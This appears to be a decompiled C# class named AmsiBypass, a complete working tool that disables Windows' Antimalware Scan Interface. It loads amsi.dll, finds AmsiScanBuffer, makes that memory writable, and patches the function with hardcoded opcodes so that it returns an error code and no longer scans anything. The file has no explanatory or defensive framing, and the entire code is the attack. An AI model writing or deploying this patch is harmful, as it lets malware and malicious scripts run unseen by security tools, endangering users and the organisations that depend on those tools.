using System;
using System.Runtime.InteropServices;

// Token: 0x02000003 RID: 3
public class AmsiBypass
{
	// Token: 0x06000008 RID: 8 RVA: 0x000021D8 File Offset: 0x000003D8
	public static void Execute()
	{
		IntPtr lib = AmsiBypass.LoadLibrary("amsi.dll");
		IntPtr asb = AmsiBypass.GetProcAddress(lib, "AmsiScanBuffer");
		byte[] patch = AmsiBypass.GetPatch;
		uint oldProtect;
		AmsiBypass.VirtualProtect(asb, (UIntPtr)((ulong)((long)patch.Length)), 64U, out oldProtect);
		Marshal.Copy(patch, 0, asb, patch.Length);
		uint num;
		AmsiBypass.VirtualProtect(asb, (UIntPtr)((ulong)((long)patch.Length)), oldProtect, out num);
	}

	// Token: 0x17000004 RID: 4
	// (get) Token: 0x06000009 RID: 9 RVA: 0x00002238 File Offset: 0x00000438
	private static byte[] GetPatch
	{
		get
		{
			bool is64Bit = AmsiBypass.Is64Bit;
			byte[] result;
			if (is64Bit)
			{
				result = new byte[]
				{
					184,
					87,
					0,
					7,
					128,
					195
				};
			}
			else
			{
				result = new byte[]
				{
					184,
					87,
					0,
					7,
					128,
					194,
					24,
					0
				};
			}
			return result;
		}
	}

	// Token: 0x17000005 RID: 5
	// (get) Token: 0x0600000A RID: 10 RVA: 0x0000227C File Offset: 0x0000047C
	private static bool Is64Bit
	{
		get
		{
			return IntPtr.Size == 8;
		}
	}

	// Token: 0x0600000B RID: 11
	[DllImport("kernel32")]
	private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

	// Token: 0x0600000C RID: 12
	[DllImport("kernel32")]
	private static extern IntPtr LoadLibrary(string name);

	// Token: 0x0600000D RID: 13
	[DllImport("kernel32")]
	private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
